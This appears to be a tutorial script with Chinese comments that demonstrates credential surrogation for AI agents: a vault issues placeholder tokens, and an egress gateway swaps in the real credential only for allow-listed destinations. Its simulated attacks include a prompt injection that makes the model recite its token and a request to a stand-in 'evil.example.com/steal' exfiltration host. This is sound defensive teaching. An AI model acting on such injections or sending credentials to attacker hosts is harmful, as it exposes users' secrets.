/**
 * Step 4 — 凭据代理：agent 永远拿不到真 token。
 *
 * 官方原文：
 *   For all such requests, code in the runtime cell or a worker only ever sees a
 *   "surrogate" token, minted by authd. After the concrete network request is
 *   authorized, Sentinel will replace any surrogate tokens with the real
 *   credential, obtained from authd, at the network boundary.
 *
 *   The agent never sees real tokens, which means any attempt to coerce the agent
 *   to reveal the actual secrets via prompt-injection or otherwise is futile.
 *
 * 核心洞察：**"拿不到"比"不泄露"强得多。**
 *   不泄露  → 依赖 agent 不犯错（提示注入下不成立）
 *   拿不到  → 即使 agent 完全被控制，也没有东西可泄露
 *
 * 用到的技术（真实）
 *   - credential surrogation（凭据代理化）：真凭据留在保险箱，调用方拿占位符
 *   - just-in-time injection（即时注入）：在网络边界，请求获批之后才替换
 *   - 分离"谁能看到凭据"与"谁能使用凭据"：authd 决定前者，Sentinel 决定后者
 *
 * 运行：node code/step4-credential-proxy.mjs
 */

const say = (depth, ...rest) => console.log('  '.repeat(depth) + rest.join(' '))
const rand = () => Math.random().toString(36).slice(2, 10)

// ══════════════════════════════════════════════════════════════════════
// authd —— 凭据保险箱（host domain，cell 碰不到）
// ══════════════════════════════════════════════════════════════════════
class Authd {
  #realCredentials = new Map()
  #surrogates = new Map() // surrogate → { provider, callerId }

  /** 只有用户/连接流程能存真凭据 */
  storeCredential(provider, token) {
    this.#realCredentials.set(provider, token)
  }

  /**
   * ★ 对外唯一能拿到的东西：代理令牌。
   * 注意它的返回值里**没有**真凭据。这不是"我们记得不返回"，
   * 是这个方法的实现里根本没有访问真凭据那条路径。
   */
  issueSurrogate(callerId, provider) {
    if (!this.#realCredentials.has(provider)) {
      throw new Error(`no credential stored for ${provider}`)
    }
    const surrogate = `surrogate_${provider}_${rand()}`
    this.#surrogates.set(surrogate, { provider, callerId })
    return surrogate
  }

  /**
   * 只给出口网关用。**不在 cell 的调用范围内**——没有 socket 接口暴露它。
   * @param surrogate 请求里携带的代理令牌
   * @param egressApproved 该具体请求是否已被 Sentinel 批准
   */
  realCredentialFor(surrogate, egressApproved) {
    if (!egressApproved) return undefined
    const record = this.#surrogates.get(surrogate)
    if (!record) return undefined
    return this.#realCredentials.get(record.provider)
  }
}

// ══════════════════════════════════════════════════════════════════════
// 外部 API —— 只认真 token
// ══════════════════════════════════════════════════════════════════════
const GITHUB = {
  realToken: 'ghp_REAL_9f3a2b1c8d7e6f5a4b3c2d1e0f9a8b7c',
  call(token, path) {
    if (token !== this.realToken) return { status: 401, body: 'Bad credentials' }
    return { status: 200, body: `repo list for ${path}` }
  },
}

// ══════════════════════════════════════════════════════════════════════
// 出口网关 —— 在内核边界做替换的唯一地方
// ══════════════════════════════════════════════════════════════════════
class EgressGateway {
  constructor(authd) {
    this.authd = authd
    this.allowedDestinations = new Set(['api.github.com'])
    this.log = []
  }

  /** @param rawRequest cell 发起的请求，携带 surrogate */
  forward(rawRequest) {
    const url = new URL(rawRequest.url)
    const approved = this.allowedDestinations.has(url.hostname)

    // 经过 L4/L7 检查后决定是否注入真凭据
    const real = rawRequest.authorization
      ? this.authd.realCredentialFor(rawRequest.authorization, approved)
      : undefined

    // 把 surrogate 换掉；没有真凭据就保持原样（下游会 401）
    const outgoing = { ...rawRequest, authorization: real ?? rawRequest.authorization }
    this.log.push({
      destination: url.hostname,
      approved,
      injected: real !== undefined,
    })

    const result = GITHUB.call(outgoing.authorization, url.pathname)
    return { ...result, _gateway: this.log.at(-1) }
  }
}

/**
 * ★ cell 侧拿到的"凭据门面"：只有申请代理令牌这一个方法。
 *
 * 这一步是整章的关键——**能力隔离靠的是"传出什么对象"，不是"检查什么调用"。**
 * cell 进程里持有的引用只能调到 request()；它没有 Authd 实例，
 * 所以 realCredentialFor 对它来说不是"被禁止调用"，而是**根本不存在的路径**。
 */
function credentialFacadeFor(authd) {
  return Object.freeze({
    request(provider) {
      return authd.issueSurrogate('cell', provider)
    },
  })
}

// ══════════════════════════════════════════════════════════════════════
// Runtime cell —— 不可信执行域
// ══════════════════════════════════════════════════════════════════════
class RuntimeCell {
  constructor(credentials, gateway) {
    this.credentials = credentials // ← 门面，不是 Authd
    this.gateway = gateway
    this.surrogate = null
  }

  /** 正常路径：向凭据门面申请一个代理令牌 */
  requestCredential(provider) {
    this.surrogate = this.credentials.request(provider)
    say(2, `cell 拿到了：${this.surrogate}`)
  }

  callApi(url) {
    return this.gateway.forward({ url, authorization: this.surrogate, method: 'GET' })
  }
}

// ══════════════════════════════════════════════════════════════════════
// 场景
// ══════════════════════════════════════════════════════════════════════
const authd = new Authd()
authd.storeCredential('github', GITHUB.realToken)
const gateway = new EgressGateway(authd)
const cell = new RuntimeCell(credentialFacadeFor(authd), gateway)

say(0, '【角色】authd 持真凭据 · cell 只有代理令牌 · 出口网关做替换')
say(0, '')

say(0, '── 正常路径 ──')
cell.requestCredential('github')
{
  const result = cell.callApi('https://api.github.com/user/repos')
  say(2, `API 返回 ${result.status}：${result.body}`)
  say(2, `网关日志：${JSON.stringify(result._gateway)}`)
}

say(0, '')
say(0, '── 攻击场景 ──')

say(0, '▸ 攻击 A：提示注入让模型把凭据念出来')
say(2, `被注入的模型输出："我的 token 是 ${cell.surrogate}"`)
say(2, '✅ 泄露的是一个代理令牌。它只在 authd 里能对上号，而且只在出口网关调用时才有用。')
say(2, `   拿它去别处用 → 假 token，无任何权限`)

say(0, '▸ 攻击 B：绕过网关，直接拿代理令牌访问 API')
{
  const direct = GITHUB.call(cell.surrogate, '/user/repos')
  say(2, `✅ API 返回 ${direct.status}：${direct.body}`)
  say(2, '   真 token 从未离开 authd，代理令牌在 API 那边不成立')
}

say(0, '▸ 攻击 C：cell 想直接向凭据服务要真 token')
{
  say(2, `cell 手里的凭据门面暴露的方法：${Object.keys(cell.credentials).join(', ')}`)
  say(2, `cell 手里有没有 Authd 实例？${cell.authd === undefined ? '没有' : '有'}`)
  say(2, '✅ realCredentialFor 不在门面上。对 cell 来说它不是"被禁止调用"，')
  say(2, '   而是——它这一侧根本没有能调到的那个对象。')
}

say(0, '▸ 攻击 D：把请求发往未授权目的地，看会不会注入真凭据')
{
  const result = cell.callApi('https://evil.example.com/steal')
  say(2, `网关日志：${JSON.stringify(result._gateway)}`)
  say(2, `API 返回 ${result.status}`)
  say(2, '✅ 目的地不在白名单 → 不注入真凭据 → 请求带着代理令牌出去，自然失败')
}

say(0, '')
say(0, '【核对】真凭据有没有可能出现在 cell 里？')
say(2, `cell 持有的全部材料：${JSON.stringify({ surrogate: cell.surrogate })}`)
say(2, `真凭据：${GITHUB.realToken.slice(0, 12)}…（只存在于 authd 和外部 API 的配置里）`)
